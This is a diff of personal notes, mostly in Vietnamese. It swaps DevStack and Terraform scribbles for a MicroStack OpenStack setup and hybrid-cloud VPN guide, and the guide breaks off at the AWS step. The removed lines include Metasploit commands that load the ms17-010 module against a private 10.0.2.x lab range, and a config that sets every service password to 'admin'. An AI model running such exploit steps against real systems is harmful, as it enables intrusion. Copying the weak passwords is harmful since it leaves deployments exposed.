@@ -1,69 +1,55 @@
-msfconsole
-snap install metasploit-framework
-search ms17-010
-use 24
-show options
-set RHOSTS 10.0.2.1-20
-set THREADS 10
-run
- Khởi động Metasploit Framework và chạy câu lệnh “search ms17-010” 
-use 2
-show options
-set RHOSTS 10.0.2.17
-set LHOSTS 10.0.2.15
-run
-help
-
+Cập nhật hệ thống và cài đặt công cụ hỗ trợ:
 sudo apt update && sudo apt upgrade -y
-sudo apt install git -y
-git clone https://opendev.org/openstack/devstack.git
-cd devstack
-./stack.sh
+sudo apt install -y net-tools curl vim git
 
-nano local.conf
-openstack service list
+Cài đặt OpenStack MicroStack:
+sudo snap install microstack --classic
 
-[[local|localrc]]
-ADMIN_PASSWORD=admin
-DATABASE_PASSWORD=admin
-RABBIT_PASSWORD=admin
-SERVICE_PASSWORD=admin
-HOST_IP=192.168.1.100
+Khởi tạo OpenStack
+sudo microstack init --auto --control
 
+Kiểm tra trạng thái:
+microstack.openstack service list
 
-http://your-ip/dashboard
+Truy cập Dashboard
+Tìm địa chỉ IP của OpenStack:
+ip a | grep "inet "
 
-openstack identity provider create --remote-id https://accounts.google.com \
-  --domain default google
+Mở trình duyệt vào địa chỉ:
+➡ http://10.20.20.1 (hoặc IP khác tùy cấu hình)
 
-openstack federation mapping create --rules rules.json aws_mapping
+Đăng nhập:
+Username: admin
+Password: Chạy lệnh để lấy mật khẩu:
+sudo snap get microstack config.credentials.admin.password
 
-provider "openstack" {
-  auth_url    = "https://your-openstack-url:5000/v3"
-  user_name   = "admin"
-  password    = "your-password"
-  tenant_name = "your-project"
-}
+Tạo Máy Ảo (Instance) trong OpenStack
+microstack.openstack image list
 
-provider "aws" {
-  region = "us-west-1"
-}
+Tạo mạng:
+microstack.openstack network create test-net
+microstack.openstack subnet create --network test-net --subnet-range 192.168.100.0/24 test-subnet
 
-resource "openstack_compute_instance_v2" "vm1" {
-  name            = "vm-openstack"
-  image_name      = "Ubuntu 22.04"
-  flavor_name     = "m1.medium"
-}
+Tạo máy ảo:
+microstack.openstack server create --flavor m1.tiny --image cirros --network test-net --security-group default my-vm
 
-resource "aws_instance" "vm2" {
-  ami           = "ami-0abcdef1234567890"
-  instance_type = "t2.micro"
-}
+Kiểm tra:
+microstack.openstack server list
 
-terraform init
-terraform apply -auto-approve
+Kết nối SSH vào Máy Ảo
+ssh cirros@<INSTANCE_IP>
+Lấy IP bằng:
+microstack.openstack server list
 
-openstack service list
-openstack network agent list
+KẾT NỐI VỚI AWS/GCP (HYBRID CLOUD)
+Cài đặt OpenStack CLI
+sudo apt install -y python3-openstackclient
+Tạo kết nối VPN giữa OpenStack và AWS/GCP
+Bước 1: Cấu hình OpenStack VPN
+microstack.openstack vpn service create --router router1 --subnet test-subnet openstack-vpn
+microstack.openstack vpn ipsec-site-connection create \
+    --vpnservice openstack-vpn --ikepolicy ike-policy \
+    --ipsecpolicy ipsec-policy --peer-address <AWS_VPN_IP> \
+    --peer-id <AWS_VPN_IP> --peer-cidr 10.0.0.0/16 aws-vpn-connection
 
-ping aws-instance-ip
+Bước 2: Cấu hình VPN trên AWS
